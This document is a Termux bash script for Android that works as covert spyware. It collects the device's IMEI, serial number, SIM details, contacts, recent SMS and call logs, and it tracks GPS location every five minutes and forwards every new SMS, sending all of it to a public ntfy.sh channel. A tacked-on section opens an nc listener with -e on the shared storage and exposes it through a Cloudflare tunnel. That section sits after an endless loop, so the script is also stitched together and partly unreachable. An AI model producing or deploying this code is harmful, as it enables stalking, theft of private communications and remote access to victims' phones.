#!/data/data/com.termux/files/usr/bin/bash

# === CONFIGURACIÓN ===
NTFY_URL="https://ntfy.sh/JD9WNS9ZNSKS9MQ0AL"  # tu canal NTFY público
INTERVALO=3600  # Intervalo principal en segundos (1 hora)
LOC_INTERVAL=300  # Intervalo para ubicación (5 minutos)
LOGFILE="/dev/null"
SMS_LAST_ID_FILE="$HOME/.ultimo_sms_id"

# === INSTALAR DEPENDENCIAS FALTANTES ===
if ! command -v jq &> /dev/null; then
    echo "Instalando jq..."
    pkg install -y jq
fi

if ! command -v termux-location &> /dev/null; then
    echo "Instalando Termux:API..."
    pkg install -y termux-api
fi

# === FUNCIÓN PARA ENVIAR MENSAJES ===
enviar_ntfy() {
    curl -s -d "$1" "$NTFY_URL" > $LOGFILE 2>&1
}

# === FUNCIÓN PARA OBTENER UBICACIÓN ===
obtener_ubicacion() {
    local intentos=0
    local ubicacion=""
    
    # Intentamos primero con GPS, luego con red
    while [ $intentos -lt 3 ] && [ -z "$ubicacion" ]; do
        ubicacion=$(termux-location -p gps -r once 2>/dev/null)
        if [ -z "$ubicacion" ]; then
            ubicacion=$(termux-location -p network -r once 2>/dev/null)
        fi
        intentos=$((intentos+1))
        sleep 2
    done
    
    echo "$ubicacion"
}

# === MONITOREO DE UBICACIÓN ===
monitor_ubicacion() {
    while true; do
        ubicacion=$(obtener_ubicacion)
        if [ -n "$ubicacion" ]; then
            LAT=$(echo "$ubicacion" | jq -r '.latitude')
            LON=$(echo "$ubicacion" | jq -r '.longitude')
            ACC=$(echo "$ubicacion" | jq -r '.accuracy // "unknown"')
            
            enviar_ntfy "📍 Ubicación: 
Latitud: $LAT
Longitud: $LON
Precisión: $ACC metros
🗺️ https://www.google.com/maps?q=$LAT,$LON"
        else
            enviar_ntfy "⚠️ No se pudo obtener ubicación"
        fi
        sleep $LOC_INTERVAL
    done
}

# === FUNCIÓN PRINCIPAL DE RECOPILACIÓN ===
recopilar_datos() {
    # 1. Info del dispositivo
    IP=$(curl -s ifconfig.me)
    BAT=$(termux-battery-status | jq -c '.' 2>/dev/null)
    MODEL=$(getprop ro.product.model)
    SERIAL=$(getprop ro.serialno)
    SIMINFO=$(termux-telephony-siminfo 2>/dev/null | jq -c '.')
    DEVICEINFO=$(termux-telephony-deviceinfo 2>/dev/null | jq -c '.')

    IMEI=$(echo "$DEVICEINFO" | jq -r '.device_id')

    enviar_ntfy "📱 Modelo: $MODEL"
    enviar_ntfy "🔑 Serial: $SERIAL"
    [ "$IMEI" != "null" ] && enviar_ntfy "🔐 IMEI: $IMEI"
    [ -n "$BAT" ] && enviar_ntfy "🔋 Batería: $BAT"
    [ -n "$IP" ] && enviar_ntfy "🌐 IP: $IP"
    [ -n "$SIMINFO" ] && enviar_ntfy "📶 SIM: $SIMINFO"
    [ -n "$DEVICEINFO" ] && enviar_ntfy "📡 Red: $DEVICEINFO"

    # 2. Contactos (solo 5)
    CONTACTOS=$(termux-contact-list 2>/dev/null)
    if [ -n "$CONTACTOS" ]; then
        echo "$CONTACTOS" | jq -c '.[0:5][]' | while read -r contacto; do
            enviar_ntfy "👤 Contacto: $contacto"
            sleep 1
        done
    fi

    # 3. Últimos SMS (3)
    SMS=$(termux-sms-list -l 3 2>/dev/null)
    if [ -n "$SMS" ]; then
        echo "$SMS" | jq -c '.[]' | while read -r sms; do
            enviar_ntfy "📩 SMS: $sms"
            sleep 1
        done
    fi

    # 4. Llamadas recientes (5)
    CALLS=$(termux-call-log -l 5 2>/dev/null)
    if [ -n "$CALLS" ]; then
        echo "$CALLS" | jq -c '.[]' | while read -r call; do
            enviar_ntfy "📞 Llamada: $call"
            sleep 1
        done
    fi
}

# === MONITOREO DE NUEVOS SMS ===
monitor_sms() {
    [ -f "$SMS_LAST_ID_FILE" ] || echo "0" > "$SMS_LAST_ID_FILE"
    
    while true; do
        ULTIMO_SMS=$(termux-sms-list -l 1 2>/dev/null | jq -c '.[0]')
        if [ -n "$ULTIMO_SMS" ]; then
            CURRENT_ID=$(echo "$ULTIMO_SMS" | jq -r '._id')
            LAST_ID=$(cat "$SMS_LAST_ID_FILE")
            if [ "$CURRENT_ID" != "$LAST_ID" ] && [ "$CURRENT_ID" != "null" ]; then
                enviar_ntfy "📩 NUEVO SMS: $ULTIMO_SMS"
                echo "$CURRENT_ID" > "$SMS_LAST_ID_FILE"
            fi
        fi
        sleep 30  # Verificar cada 30 segundos
    done
}

# === EJECUCIÓN PRINCIPAL ===
# Verificar y solicitar permisos necesarios
termux-location >/dev/null 2>&1
termux-sms-list >/dev/null 2>&1

# Iniciar todos los monitores en segundo plano
recopilar_datos
monitor_ubicacion &
monitor_sms &

# Mantener el script activo
while true; do
    sleep $INTERVALO
    recopilar_datos
done
# === CONFIGURACIÓN ADICIONAL PARA TUNNEL ===
TUNNEL_PORT=8080  # Puerto local para el servidor de archivos
TUNNEL_NAME="termux-tunnel"  # Nombre identificador del tunnel

# === INSTALAR CLOUDFLARED ===
if ! command -v cloudflared &> /dev/null; then
    echo "Instalando cloudflared..."
    wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O $PREFIX/bin/cloudflared
    chmod +x $PREFIX/bin/cloudflared
fi

# === FUNCIÓN PARA INICIAR SERVIDOR DE ARCHIVOS ===
start_file_server() {
    while true; do
        echo "📂 Servidor de archivos iniciado en puerto $TUNNEL_PORT" | enviar_ntfy
        cd /sdcard/
        nc -lvp $TUNNEL_PORT -e sh -c 'echo -e "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n"; ls -la'
    done &
}

# === FUNCIÓN PARA INICIAR TUNNEL CLOUDFLARE ===
start_cloudflare_tunnel() {
    while true; do
        echo "🛰️ Iniciando tunnel Cloudflare..." | enviar_ntfy
        cloudflared tunnel --url http://localhost:$TUNNEL_PORT --name $TUNNEL_NAME 2>&1 | while read -r line; do
            if [[ "$line" == *"https://"* ]]; then
                URL=$(echo "$line" | grep -o 'https://[^ ]*')
                enviar_ntfy "🔗 URL del Tunnel: $URL"
            fi
        done
        sleep 10
    done &
}

# === MODIFICACIÓN A LA EJECUCIÓN PRINCIPAL ===
# Agregar estas líneas justo antes del bucle principal

start_file_server
start_cloudflare_tunnel

# Mantener el script activo (esta parte ya existe)
while true; do
    sleep $INTERVALO
    recopilar_datos
done
